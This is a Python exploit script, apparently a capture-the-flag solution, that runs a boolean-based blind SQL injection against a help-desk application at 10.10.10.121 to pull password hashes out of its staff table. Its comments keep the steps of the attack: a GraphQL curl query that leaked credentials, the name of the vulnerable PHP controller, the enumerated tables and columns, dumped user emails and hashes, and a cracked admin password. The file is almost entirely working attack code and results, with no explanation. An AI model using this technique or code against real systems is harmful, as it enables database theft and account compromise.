import yasqlit as ya

URL = 'http://10.10.10.121/support/'

def pPayload(p):
    sqli = f'6 and ({p})=1'
    return sqli

def boolPredicate(res):
    if 'Content-Disposition' in res.headers.keys():
        return True
    else:
        return False

def pwn():
    # curl 'http://10.10.10.121:3000/GRAPHQL?query=query%7buser%7b%20username%20password%7d%7d'
    # helpme@helpme.com:godhelpmeplz
    # sqli in view_tickets_controller.php
    t = ya.Transport(payloadProcessor=pPayload, predicate=boolPredicate, requestPath='req-view.txt')
    
    # qry = 'select @@version' # 5.7.24-0ubuntu0.16.04.1
    # r = ya.boolExfiltrate(t, qry, 'mysql')

    # users, settings
    # qry = ya.templates['mysql']['select']['tables']
    # ['USER', 'CURRENT_CONNECTIONS', 'TOTAL_CONNECTIONS', 'id', 'salutation', 'fullname', 'email', 'password', 'timezone', 'status']
    # qry = ya.templates['mysql']['select']['columns'].format(table='users')
    # qry = 'select email from users'
    # qry = 'select password from users'
    # helpme@helpme.com:c3b3bd1eb5142e29adb0044b16ee4d402d06f9ca
    # lolololol@yopmail.com:ec09fa0d0ba74336ea7fe392869adb198242f15a
    # qry = ya.templates['mysql']['select']['columns'].format(table='staff')
    # ['id', 'username', 'password', 'fullname', 'email', 'login', 'last_login', 'department', 'timezone', 'signature', 'newticket_notification', 'avatar', 'admin', 'status']
    # qry = 'select username from staff'
    qry = 'select password from staff'
    # admin:d318f44739dced66793b1a603028133a76ae680e:Welcome1

    r = ya.boolExfiltrateList(t, qry, 'mysql')
    # print(r)




pwn()